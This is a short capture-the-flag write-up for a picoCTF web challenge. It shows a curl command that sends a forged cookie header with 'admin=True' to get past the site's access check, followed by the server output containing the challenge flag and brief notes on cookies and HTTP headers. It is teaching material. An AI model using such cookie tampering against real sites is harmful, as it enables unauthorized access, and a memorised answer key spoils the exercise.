

## Goal

The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/44573/` ([link](https://jupiter.challenges.picoctf.org/problem/44573/)) or http://jupiter.challenges.picoctf.org:44573
## Solution

HTTP headers
+ Ctr+u
+ Network
+ Log in on the site 
+ After, we need to find header cookies
+ When you open inpect mode/network/cookies
+ You find the cookies
+ Use curl
```bash
curl https://jupiter.challenges.picoctf.org/problem/44573/flag -H "Cookie: username=1234124; password=5434665436; admin=True" | grep pico
curl https://jupiter.challenges.picoctf.org/problem/44573/flag -H "Cookie: username=1234124; password=5434665436; admin=True" | grep pico
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1312  100  1312    0     0    357      0  0:00:03  0:00:03 --:--:--   357
<p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc}</code></p>
````
## Notes

- **In web terms:** Cookies are small pieces of data that a website stores on your computer's web browser. Websites use them for various purposes, including:
    - **Remembering your login information** so you don't have to re-enter credentials every time.
    - **Tracking your preferences** for better personalization.
    - **Keeping track of items in your online shopping cart**.
    - **Understanding how you interact with the website**.

-  **HTTP headers** let the client and the server pass additional information with an HTTP request or response. An HTTP header consists of its case-insensitive name followed by a colon (`:`), then by its value. [Whitespace](https://developer.mozilla.org/en-US/docs/Glossary/Whitespace) before the value is ignored.

## References

[HTTP headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
[Cookie](https://www.kaspersky.com/resource-center/definitions/cookies)
